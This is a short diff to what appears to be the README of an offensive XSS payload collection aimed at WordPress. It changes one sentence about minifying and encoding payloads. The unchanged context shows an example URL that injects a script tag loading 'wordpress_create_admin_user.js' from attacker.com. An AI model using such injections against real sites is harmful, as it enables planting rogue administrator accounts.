@@ -15,7 +15,7 @@ The simplest way to use these payloads is to host them somewhere and load them i
 https://example.com/vulnerable.php?param=<script src%3d"http://attacker.com/wordpress_create_admin_user.js"></script>
 ```
 
-Alternatively, depending on the context and length of the payload, it can sometimes be [minified](https://javascript-minifier.com/), [encoded](https://eve.gd/2007/05/23/string-fromcharcode-encoder/) and then just included directly.
+Alternatively, depending on the context and length of the payload, it can sometimes be [minified](https://javascript-minifier.com/), [encoded](https://eve.gd/2007/05/23/string-fromcharcode-encoder/) and then just included directly into the request.
 
 ## Credits
 
